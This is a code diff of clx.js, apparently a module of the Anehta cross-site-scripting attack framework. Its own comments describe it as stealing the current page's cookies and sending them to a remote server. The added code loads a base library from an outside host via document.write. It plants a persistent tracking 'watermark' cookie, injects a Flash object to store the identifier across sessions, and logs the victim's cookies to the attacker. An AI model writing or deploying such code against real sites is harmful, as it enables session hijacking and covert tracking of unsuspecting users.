@@ -1,5 +1,5 @@
 /////////////////////////////////////////////////
-// clx.js 楚留香模块，盗取当前页面cookie
+// clx.js 楚留香模块，盗取当前页面cookie, 标记水印
 // 并发送到远程server
 //alert("clx.js 楚留香模块");
 /////////////////////////////////////////////////
@@ -8,23 +8,76 @@
 // 开始执行功能
 // Author: axis
 ////////////////////////////////////////////////////////////
-// 有时后需要在远程单独加载此模块,所以需要单独定义好
-/*检测是否加载了js文件*/
-var anehtaurl = "http://www.secwiki.com/anehta";
-var BaseLib = anehtaurl+"/library/base.js";
 
+// 配合回旋镖模块使用时单独加载BaseLib
+// 检查BaseLib是否加载
+if (typeof anehta == "undefined"){
+	//alert("Base Lib is not Loaded!");
+	var anehtaurl = "http://www.secwiki.com/anehta";
+  var BaseLib = anehtaurl+"/library/base.js";
+	document.write("<script src="+BaseLib+"></script>");
+}
 
-if (typeof isBaseLibLoaded == "undefined" ){
-	//alert("base not load");
-	//document.write("<script src="+BaseLib+"></script>");
-	//anehta.core.freeze(200);
+// 等待BaseLib加载
+setTimeout(function(){
+  // 由于xcookie模块,在ff中可能用iframe获取跨域cookie,先检查uri中是否包含水印
+  if (window.location.href.indexOf("anehtaWatermark=") > -1){
+  	//alert(document.domain);
+  	anehta.dom.addCookie("anehtaWatermark", anehta.dom.getQuerystr("anehtaWatermark"));
+  	anehta.dom.persistCookie("anehtaWatermark");	// 让水印不过期
+  	anehta.logger.logCookie();
+  }
+},
+1000);
+
+// 以下是正常加载clx过程
+var ts = new Date();
+ts = ts.getTime(); // 随机数,作为水印,只加载一次
+var watermarkvalue = "FirstCatch:"+$d.domain+"|"+ts;
+//alert(watermarkvalue);
+
+if (anehta.dom.checkCookie("anehtaWatermark") == false){ // cookie中没有水印
+	if (anehta.detect.flash('8') == true){ // 检测是否有flash
+		// 插入水印flash; 加载flash需要时间
+		anehta.inject.injectFlash("anehtaWatermark", watermarkflash, $d.domain);
+		//alert(1);
+		
+		setTimeout(function(){
+			  if ( anehta.core.getWatermark("anehtaWatermark") == undefined ){ 				                      
+		       // flash cache 中没有记录,需要设置一个
+		       anehta.core.setWatermark("anehtaWatermark", watermarkvalue);
+		    }
+		    // 读取水印并写进cookie
+		    anehta.dom.addCookie("anehtaWatermark", anehta.core.getWatermark("anehtaWatermark"));
+		                      
+		    anehta.dom.persistCookie("anehtaWatermark");	// 让水印不过期			                                 
+        // 记录当前cookie
+	      anehta.logger.logCookie();
+	    },
+	    500);
+		
+	} else { // 不支持flash	
+	    // 在cookie里添加水印
+      anehta.dom.addCookie("anehtaWatermark", watermarkvalue); 
+      anehta.dom.persistCookie("anehtaWatermark");	// 让水印不过期		 
+      anehta.logger.logCookie();     
+  }  
 } 
+else { // cookie 中有水印, 不需要重复记录cookie了
+//检查flashcache中是否有水印,如果没有,则把cookie里的水印写入flashcache 
+ 	if (anehta.detect.flash('8') == true){ // 检测是否有flash
+		// 插入水印flash; 加载flash需要时间
+		anehta.inject.injectFlash("anehtaWatermark", watermarkflash, $d.domain);
 
-if (anehta.dom.checkCookie("clx") == false){
-	// 在cookie里做标记
-	anehta.dom.addCookie("clx", "");
-	//alert(anehta.dom.getCookie("clx"));
-  setTimeout(function(){ anehta.logger.logCookie(); } ,50);
+		setTimeout(function(){if ( anehta.core.getWatermark("anehtaWatermark") == undefined ){ 				                      
+		                      	// flash cache 中没有记录,需要设置一个
+		                      	anehta.core.setWatermark("anehtaWatermark", anehta.dom.getCookie("anehtaWatermark"));
+		                      }
+		                    },
+		                    500);
+  } else { // 不支持flash
+  	// do nothing
+  } 	
 }
 
 
